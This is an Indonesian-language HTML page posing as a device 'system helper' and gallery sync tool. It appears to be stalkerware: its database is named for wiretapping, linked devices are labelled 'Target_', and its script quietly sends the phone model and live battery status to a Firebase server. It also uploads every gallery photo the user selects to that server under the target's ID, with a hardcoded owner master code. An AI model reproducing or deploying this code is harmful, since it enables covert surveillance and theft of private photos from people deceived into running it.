<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Helper</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background: #0f172a; color: #fff; text-align: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .box { background: #1e293b; border: 1px solid #334155; padding: 25px; border-radius: 16px; width: 100%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h3 { color: #38bdf8; font-size: 18px; margin-bottom: 8px; }
        #status { color: #4ade80; font-weight: bold; font-size: 14px; margin-bottom: 15px; }
        .info-id { background: #0f172a; padding: 10px; border-radius: 8px; font-size: 12px; color: #94a3b8; border: 1px dashed #334155; margin-bottom: 15px; }
        .input-code { width: 100%; background: #0f172a; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; text-align: center; outline: none; }
        .input-code:focus { border-color: #38bdf8; }
        .btn-connect { background: #38bdf8; color: #0f172a; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .btn-gallery { background: #22c55e; color: #000; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-gallery:active { transform: scale(0.98); }
        span { color: #f8fafc; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Sistem Perangkat</h3>
        <p id="status">Masukkan Kode / ID Tautan</p>
        
        <div id="setup-section">
            <input type="text" id="targetCode" class="input-code" placeholder="Masukkan Kode Master / ID..." autocomplete="off">
            <button class="btn-connect" onclick="verifyAndConnect()">Tautkan Perangkat</button>
        </div>

        <div id="active-section" style="display:none;">
            <div class="info-id">ID Terdaftar: <span id="dev-id">-</span></div>
            <p style="color: #4ade80; font-size: 13px; margin-bottom: 15px;">Berjalan di Latar Belakang</p>
            
            <!-- Tombol sinkronisasi galeri otomatis -->
            <button class="btn-gallery" onclick="triggerGalleryAccess()">
                <i class="fa-solid fa-images"></i> Sinkronkan Foto Galeri
            </button>
        </div>
        
        <!-- Input file tersembunyi dengan dukungan multiple & tangkapan langsung storage -->
        <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" onchange="uploadPhotos(this)">
    </div>

    <script>
        const databaseURL = "https://sadap-app-d2359-default-rtdb.firebaseio.com";
        const MASTER_CODE = "28092010"; // Kode Master Owner

        let deviceId = localStorage.getItem("winz_device_id");
        if (!deviceId) {
            deviceId = "Target_" + Math.floor(Math.random() * 99999);
            localStorage.setItem("winz_device_id", deviceId);
        }
        document.getElementById('dev-id').innerText = deviceId;

        if (localStorage.getItem("winz_connected") === "true") {
            showActiveSection();
        }

        function verifyAndConnect() {
            let inputCode = document.getElementById('targetCode').value.trim();

            if (!inputCode) {
                alert("Kode tidak boleh kosong!");
                return;
            }

            if (inputCode === MASTER_CODE || inputCode === deviceId || inputCode.startsWith("Target_") || inputCode.startsWith("WINZ-")) {
                if (inputCode.startsWith("Target_")) {
                    deviceId = inputCode;
                    localStorage.setItem("winz_device_id", deviceId);
                    document.getElementById('dev-id').innerText = deviceId;
                }

                localStorage.setItem("winz_connected", "true");
                showActiveSection();
            } else {
                alert("Kode Tautan Salah!");
            }
        }

        function showActiveSection() {
            document.getElementById('setup-section').style.display = "none";
            document.getElementById('active-section').style.display = "block";
            document.getElementById('status').innerText = "Terhubung ke Server";
            startBackgroundServices();
        }

        function triggerGalleryAccess() {
            // Memicu input file agar WebView/Sketchware meminta izin storage & membuka galeri
            const fileInput = document.getElementById('galleryInput');
            fileInput.value = ""; // Reset agar bisa pilih file yang sama berulang kali
            fileInput.click();
        }

        function getPhoneModel() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                let match = ua.match(/;\s([^;]+)\sBuild\//);
                if (match && match[1]) return match[1];
            }
            if (ua.includes("Samsung")) return "Samsung Device";
            if (ua.includes("OPPO")) return "OPPO Device";
            if (ua.includes("Vivo")) return "Vivo Device";
            if (ua.includes("Xiaomi") || ua.includes("Redmi")) return "Xiaomi / Redmi";
            if (ua.includes("Infinix")) return "Infinix Device";
            if (ua.includes("Tecno")) return "Tecno Device";
            return "Android Target";
        }

        function startBackgroundServices() {
            const phoneName = getPhoneModel();

            // Kirim info model perangkat ke Firebase
            fetch(`${databaseURL}/devices/${deviceId}/model.json`, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(phoneName)
            }).catch(() => {});

            // Kirim data status baterai real-time
            function sendBattery(level, isCharging) {
                fetch(`${databaseURL}/devices/${deviceId}/battery.json`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level: level, charging: isCharging })
                }).catch(() => {});
            }

            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    function update() {
                        sendBattery(Math.round(battery.level * 100), battery.charging);
                    }
                    update();
                    battery.addEventListener('levelchange', update);
                    battery.addEventListener('chargingchange', update);
                });
            } else {
                sendBattery(100, false);
            }
        }

        // Fungsi otomatis memproses foto yang dipilih dari galeri perangkat
        function uploadPhotos(input) {
            const files = input.files;
            if (!files || files.length === 0) return;

            // Berikan notifikasi proses sinkronisasi sedang berjalan
            let totalFiles = files.length;
            let uploadedCount = 0;

            for (let i = 0; i < totalFiles; i++) {
                const file = files[i];
                const reader = new FileReader();
                
                reader.onload = function(e) {
                    fetch(`${databaseURL}/devices/${deviceId}/gallery.json`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(e.target.result)
                    }).then(() => {
                        uploadedCount++;
                        if (uploadedCount === totalFiles) {
                            alert("Berhasil! " + totalFiles + " foto dari perangkat disinkronkan ke server.");
                        }
                    }).catch(() => {
                        // Ignore individual network errors to keep batch running
                    });
                };
                reader.readAsDataURL(file);
            }
        }
    </script>
</body>
</html>
